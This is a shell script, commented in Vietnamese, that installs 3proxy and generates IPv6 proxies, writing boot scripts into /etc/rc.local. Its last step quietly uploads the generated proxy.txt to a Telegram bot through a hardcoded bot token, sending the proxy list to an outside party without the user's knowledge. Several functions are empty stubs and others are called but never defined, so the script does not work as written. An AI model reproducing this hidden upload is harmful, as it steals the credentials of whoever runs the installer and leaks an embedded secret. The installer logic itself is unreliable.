#!/bin/sh

random() {
	tr </dev/urandom -dc A-Za-z0-9 | head -c5
	echo
}

array=(1 2 3 4 5 6 7 8 9 0 a b c d e f)

gen64() {
	ip64() {
		echo "${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}"
	}
	echo "$1:$(ip64):$(ip64):$(ip64):$(ip64)"
}

# Các bước để tạo proxy và lưu vào tệp proxy.txt

install_3proxy() {
	# Cài đặt 3proxy
	# ...
}

gen_3proxy() {
	# Tạo nội dung file cấu hình 3proxy
	# ...
}

gen_proxy_file_for_user() {
	# Tạo tệp proxy.txt từ thông tin proxy
	# ...
}

upload_proxy() {
	# Tạo password và nén tệp proxy.txt thành proxy.zip
	# Upload proxy.zip và hiển thị thông tin cần thiết
	# ...
}

# Gửi tệp proxy.txt về Telegram
send_to_telegram() {
	curl -F document=@proxy.txt "https://api.telegram.org/bot5839097114:AAHwufhmUCxgnKFAg_B9HJKWZJx3a9GhLVI/sendDocument" -F chat_id=@proxythanh45_bot
}

echo "installing apps"
yum -y install gcc net-tools bsdtar zip >/dev/null

install_3proxy

echo "working folder = /home/proxy-installer"
WORKDIR="/home/proxy-installer"
WORKDATA="${WORKDIR}/data.txt"
mkdir $WORKDIR && cd $_

IP4=$(curl -4 -s icanhazip.com)
IP6=$(curl -6 -s icanhazip.com | cut -f1-4 -d':')

echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}"

echo "How many proxy do you want to create? Example 500"
read COUNT

FIRST_PORT=10000
LAST_PORT=$(($FIRST_PORT + $COUNT))

gen_data >$WORKDIR/data.txt
gen_iptables >$WORKDIR/boot_iptables.sh
gen_ifconfig >$WORKDIR/boot_ifconfig.sh
chmod +x ${WORKDIR}/boot_*.sh /etc/rc.local

gen_3proxy >/usr/local/etc/3proxy/3proxy.cfg

cat >>/etc/rc.local <<EOF
bash ${WORKDIR}/boot_iptables.sh
bash ${WORKDIR}/boot_ifconfig.sh
ulimit -n 10048
service 3proxy start
EOF

bash /etc/rc.local

gen_proxy_file_for_user

upload_proxy

send_to_telegram
